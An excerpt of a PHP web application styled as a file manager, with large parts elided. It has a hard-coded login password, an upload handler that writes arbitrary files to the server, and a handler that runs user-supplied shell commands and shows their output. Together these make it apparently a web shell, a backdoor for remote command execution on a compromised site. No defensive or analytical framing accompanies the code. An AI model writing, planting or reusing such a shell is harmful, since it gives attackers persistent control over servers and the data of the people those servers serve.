...
// ── Authentication ──────────────────────────────────────────
define('FM_PASSWORD_HASH', password_hash('KanjutDolphin', PASSWORD_BCRYPT));
$authError = '';
...
if($_SERVER['REQUEST_METHOD']==='POST'){
    ...
    if(isset($_FILES['fileToUpload'])){
        ...
        if(move_uploaded_file($_FILES["fileToUpload"]["tmp_name"],$t)){$statusMessage='File "'.htmlspecialchars(basename($_FILES["fileToUpload"]["name"])).'" uploaded';$statusType='success';}
        ...
        if(is_resource($proc)){
            ...
            $viewCommandResult=['type'=>'command','label'=>'$ '.htmlspecialchars($cmd),'content'=>htmlspecialchars(!empty($err)?$err:$out),'filename'=>''];
    ...
    <div class="mb-6 bg-surface-900 border border-slate-700/50 rounded-xl overflow-hidden animate-slide-up" id="resultBox">
        <div class="flex items-center justify-between px-4 py-2.5 bg-slate-800/50 border-b border-slate-700/50">
            ...
            <div class="flex items-center gap-2">
                ...
                <button type="button" onclick="openEditorFromResultBox()" data-filename="<?php echo htmlspecialchars($viewFilename, ENT_QUOTES, 'UTF-8'); ?>" class="text-xs px-2.5 py-1 rounded-lg bg-violet-500/15 text-violet-400 border border-violet-500/20 hover:bg-violet-500/25 transition-all mono">Edit</button>
                <?php endif; ?>
        ...
        <pre class="overflow-auto max-h-96"><code class="language-<?php echo htmlspecialchars(extLang(strtolower(pathinfo($viewFilename,PATHINFO_EXTENSION)))); ?> text-xs"><?php echo $viewCommandResult['content']; ?></code></pre>
        <?php else: ?>
